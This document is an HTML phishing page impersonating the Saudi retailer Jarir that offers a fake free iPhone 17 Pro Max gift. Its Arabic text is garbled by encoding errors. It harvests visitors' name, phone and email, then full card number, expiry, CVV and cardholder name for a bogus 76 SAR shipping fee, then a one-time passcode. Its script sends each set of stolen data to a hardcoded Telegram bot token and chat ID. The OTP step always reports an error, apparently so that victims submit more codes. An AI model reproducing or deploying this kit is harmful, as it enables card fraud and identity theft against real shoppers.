<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø±ÙŠØ± - iPhone 17 Pro Max</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
        .page { display: none; min-height: 100vh; }
        .page.active { display: block; }
        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
        
        /* Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ø³Ù„Ø© Ø¬Ø±ÙŠØ± */
        .cart-icon-container { position: relative; background: #F0F2F5; padding: 8px; border-radius: 8px; }
        .cart-badge { position: absolute; top: -5px; right: -5px; background: #FF9800; color: white; font-size: 10px; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        
        /* Ø²Ø± Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ø£Ø¹Ù„Ù‰ */
        .back-to-top { position: fixed; bottom: 80px; left: 20px; background: white; border: 1px solid #DDD; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); z-index: 100; }

        /* --- [Ø­Ù‚Ù† Ø¥Ø¶Ø§ÙØ§Øª Ø¬Ø¯ÙŠØ¯Ø©] --- */
        .error-inline { display: none; color: white; background: var(--jarir-red); padding: 10px; border-radius: 6px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--jarir-red); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* --------------------------- */
    </style>
</head>
<body class="max-w-md mx-auto shadow-2xl bg-white">

    <div id="loader">
        <div class="spinner"></div>
        <p class="mt-4 text-gray-500 text-sm">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</p>
    </div>

    <section id="page-product" class="page active">
        <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <i class="fa-solid fa-bars text-xl text-gray-600"></i>
                <div class="cart-icon-container">
                    <i class="fa-solid fa-cart-shopping text-gray-600"></i>
                    <span class="cart-badge">1</span>
                </div>
            </div>
            <div class="flex items-center gap-1">
                <div class="relative flex items-center bg-gray-100 rounded-full px-4 py-1">
                    <input type="text" value="iphone 17 pro max" readonly class="bg-transparent text-sm text-right outline-none w-32">
                    <i class="fa-solid fa-magnifying-glass text-gray-400 mr-2"></i>
                </div>
                <div class="flex items-center ml-2">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-6">
                </div>
            </div>
        </header>

        <div class="bg-gray-50 p-3 flex justify-between items-center border-b text-sm text-gray-500">
            <i class="fa-solid fa-chevron-down text-xs"></i>
            <span>Ø­Ø¯Ø¯ Ø®ÙŠØ§Ø± Ø§Ù„ØªÙˆØµÙŠÙ„ Ø§Ù„Ø°ÙŠ ØªÙØ¶Ù„Ù‡</span>
        </div>

        <div class="py-6 flex justify-center">
            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px]">
        </div>

        <main class="p-5">
            <div class="flex justify-between items-start mb-2">
                <div class="text-right">
                    <p class="text-[10px] text-gray-400">Ø±Ù‚Ù… Ø§Ù„ØµÙ†Ù 666736 Ø±Ù‚Ù… Ø§Ù„Ù…Ù†ØªØ¬ MFY94AHA</p>
                    <h1 class="text-xl font-bold text-gray-900">Ø§Ø¨Ù„ Ø¢ÙŠÙÙˆÙ† 17 Ø¨Ø±Ùˆ Ù…Ø§ÙƒØ³</h1>
                </div>
                <i class="fa-brands fa-apple text-3xl"></i>
            </div>
            
            <div class="flex flex-wrap gap-2 mb-6 justify-end">
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">256 Ø¬ÙŠØ¬Ø§Ø¨Ø§ÙŠØª</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ ÙƒÙˆØ²Ù…Ùƒ Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø§Ù…Ø³</span>
                <span class="border px-3 py-1 text-xs text-gray-500 rounded">Ø¢Ø¨Ù„ Ø¢ÙŠÙ‡ 19 Ø¨Ø±Ùˆ</span>
            </div>

            <div class="flex justify-between items-center mb-6">
                <button onclick="showPage('page-register')" class="bg-[#E30613] text-white font-bold w-1/2 py-4 rounded-lg text-lg">Ø§Ø³ØªÙ„Ù… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</button>
                <div class="text-right">
                    <div class="text-[#E30613] text-3xl font-black">Ù‡Ø¯ÙŠÙ‡ Ù…Ù† Ø¬Ø±ÙŠØ± <span class="text-sm">Ø±.Ø³</span></div>
                    <p class="text-[10px] text-gray-400">Ø´Ø§Ù…Ù„ Ø¶Ø±ÙŠØ¨Ø© Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ù…Ø¶Ø§ÙØ©</p>
                </div>
            </div>

            <div class="flex justify-between py-6 border-t mt-4">
                <i class="fa-brands fa-linkedin text-[#0077B5] text-2xl"></i>
                <i class="fa-brands fa-tiktok text-black text-2xl"></i>
                <i class="fa-brands fa-snapchat text-[#FFFC00] bg-black p-1 rounded-full text-lg"></i>
                <i class="fa-brands fa-youtube text-[#FF0000] text-2xl"></i>
                <i class="fa-brands fa-instagram text-[#E4405F] text-2xl"></i>
                <i class="fa-brands fa-x-twitter text-black text-2xl"></i>
                <i class="fa-brands fa-facebook text-[#1877F2] text-2xl"></i>
            </div>
        </main>
    </section>

    <section id="page-register" class="page bg-white">
        <header class="p-4 border-b flex justify-between items-center">
            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right"></i>Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªØ³Ù„ÙŠÙ… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-5">
        </header>
        <div class="p-6 space-y-4">
            <div id="err-reg" class="error-inline">ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­</div>
            
            <div class="text-right">
                <label class="text-xs text-gray-400">Ø§Ø³Ù… Ø§Ù„Ø¯ÙˆÙ„Ø©</label>
                <div class="form-input flex justify-between items-center bg-gray-50">
                    <i class="fa-solid fa-chevron-down text-xs"></i>
                    <span class="font-bold">Ø§Ù„Ù…Ù…Ù„ÙƒØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©</span>
                </div>
            </div>
            <div class="flex gap-2">
                <div class="w-2/3">
                    <label class="text-xs text-gray-400 text-right block">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                    <input type="tel" id="user-phone" class="form-input">
                </div>
                <div class="w-1/3">
                    <label class="text-xs text-gray-400 text-right block">Ø±Ù…Ø² Ø§Ù„Ø¯ÙˆÙ„Ø©</label>
                    <div class="form-input flex items-center justify-between">
                        <i class="fa-solid fa-chevron-down text-[10px]"></i>
                        <span class="font-bold">+966</span>
                        <img src="https://flagcdn.com/w20/sa.png" class="w-4">
                    </div>
                </div>
            </div>
            <input type="text" id="user-name" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„" class="form-input">
            <input type="email" id="user-email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" class="form-input">
            <button onclick="sendData('register')" class="btn-red py-4 mt-6">Ø§Ø³ØªÙ…Ø±Ø§Ø±</button>
        </div>
    </section>

    <section id="page-payment" class="page bg-[#F3F5F7]">
        <header class="p-4 bg-white border-b flex justify-between items-center">
            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right"></i>Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ø¯ÙØ¹ Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù†</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-5">
        </header>
        <main class="p-4">
            <div id="err-pay" class="error-inline">Ø¹Ø°Ø±Ø§Ù‹ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>

            <div class="bg-white rounded-lg p-6 shadow-sm border relative">
                <div class="flex justify-between items-center border p-3 rounded-lg mb-6 border-blue-500 bg-blue-50">
                    <div class="w-5 h-5 border-[5px] border-blue-600 rounded-full"></div>
                    <div class="text-right">
                        <span class="text-sm font-bold block">Ø§Ù„Ø¯ÙØ¹ Ø¨Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø§Ø¦ØªÙ…Ø§Ù†ÙŠØ©</span>
                        <div id="card-type-box" class="flex gap-1 mt-1">
                            <img src="https://img.icons8.com/color/48/visa.png" class="h-4 card-v opacity-30">
                            <img src="https://img.icons8.com/color/48/mastercard.png" class="h-4 card-m opacity-30">
                        </div>
                    </div>
                </div>
                <div class="space-y-4">
                    <input type="text" id="card-num" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" class="form-input" maxlength="16" oninput="detectCard(this.value)">
                    <div class="flex gap-2">
                        <input type="text" id="card-cvv" placeholder="Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ (CVV)" class="form-input w-1/3" maxlength="3">
                        <input type="text" id="card-exp" placeholder="MM/YY" class="form-input w-2/3" maxlength="5" oninput="formatExpiry(this)">
                    </div>
                    <input type="text" id="card-holder" placeholder="Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" class="form-input">
                </div>
                <button onclick="sendData('payment')" class="btn-red py-4 mt-8">Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù†( 76Ø±.Ø³.)</button>
            </div>

            <div class="mt-8 grid grid-cols-4 gap-2 px-4">
                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mada_Logo.svg" class="h-3"></div>
                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://img.icons8.com/color/48/mastercard.png" class="h-4"></div>
                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://img.icons8.com/color/48/visa.png" class="h-4"></div>
                <div class="bg-white border rounded p-1 flex items-center justify-center"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Apple_Pay_logo.svg" class="h-4"></div>
            </div>
        </main>

        <div class="p-4 flex justify-between items-center">
            <i class="fa-solid fa-fingerprint text-3xl text-gray-300"></i>
            <div class="back-to-top" onclick="window.scrollTo(0,0)"><i class="fa-solid fa-chevron-up text-gray-400"></i></div>
        </div>
    </section>

    <section id="page-otp" class="page bg-white">
        <header class="p-4 border-b flex justify-between items-center">
             <span class="text-blue-600 text-2xl font-bold" onclick="showPage('page-payment')">â®</span>
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Jarir_Bookstore_Logo.svg" class="h-5">
        </header>
        <div class="p-8 text-center">
            <div id="err-otp" class="error-inline">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰</div>
            <img src="https://img.icons8.com/color/96/shield.png" class="mx-auto w-16 mb-4">
            <h2 class="text-xl font-bold mb-2">Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¹Ù…Ù„ÙŠØ©</h2>
            <p class="text-gray-500 text-sm mb-6">ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ù…Ø±Ø³Ù„ Ø¥Ù„Ù‰ Ù‡Ø§ØªÙÙƒÙ… Ù„Ø¥ØªÙ…Ø§Ù… Ø¯ÙØ¹ 76.00 Ø±.Ø³</p>
            <input type="tel" id="user-otp" placeholder="Enter OTP" class="form-input text-center text-2xl tracking-[10px] h-16">
            <button onclick="sendData('otp')" class="bg-blue-600 text-white w-full py-4 rounded-lg font-bold mt-6">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
        </div>
    </section>

    <script>
        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
        const chatId = "1705240737";

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        // Ø­Ù‚Ù† ÙˆØ¸ÙŠÙØ© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        function detectCard(v) {
            const visa = document.querySelector('.card-v');
            const master = document.querySelector('.card-m');
            visa.classList.add('opacity-30'); master.classList.add('opacity-30');
            if(v.startsWith('4')) visa.classList.remove('opacity-30');
            if(v.startsWith('5')) master.classList.remove('opacity-30');
        }

        // Ø­Ù‚Ù† ÙˆØ¸ÙŠÙØ© Slash Ø§Ù„ØªØ§Ø±ÙŠØ®
        function formatExpiry(i) {
            let v = i.value.replace(/\D/g, '');
            if (v.length >= 2) i.value = v.substring(0, 2) + '/' + v.substring(2, 4);
        }

        async function sendData(step) {
            document.querySelectorAll('.error-inline').forEach(e => e.style.display = 'none');
            
            if(step === 'register') {
                const phone = document.getElementById('user-phone').value;
                const email = document.getElementById('user-email').value;
                if(phone === "" || !email.includes("@")) {
                    document.getElementById('err-reg').style.display = 'block';
                    return;
                }
                const text = `ğŸ‘¤ Ø²Ø¨ÙˆÙ† Ø¬Ø¯ÙŠØ¯:\nğŸ“ Ù‡Ø§ØªÙ: ${phone}\nğŸ“ Ø§Ø³Ù…: ${document.getElementById('user-name').value}\nğŸ“§ Ø¨Ø±ÙŠØ¯: ${email}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                showPage('page-payment');

            } else if(step === 'payment') {
                const card = document.getElementById('card-num').value;
                if(card.length < 16) {
                    document.getElementById('err-pay').style.display = 'block';
                    return;
                }
                const text = `ğŸ’³ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:\nğŸ”¢ Ø±Ù‚Ù…: ${card}\nğŸ“… ØªØ§Ø±ÙŠØ®: ${document.getElementById('card-exp').value}\nğŸ”’ CVV: ${document.getElementById('card-cvv').value}\nğŸ‘¤ Ø§Ø³Ù…: ${document.getElementById('card-holder').value}`;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                
                document.getElementById('loader').style.display = 'flex';
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    showPage('page-otp');
                }, 2500);

            } else if(step === 'otp') {
                const otp = document.getElementById('user-otp').value;
                if(otp === "") {
                    document.getElementById('err-otp').style.display = 'block';
                    return;
                }
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ”‘ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚: " + otp)}`);
                document.getElementById('err-otp').style.display = 'block';
            }
        }
    </script>
</body>
</html>
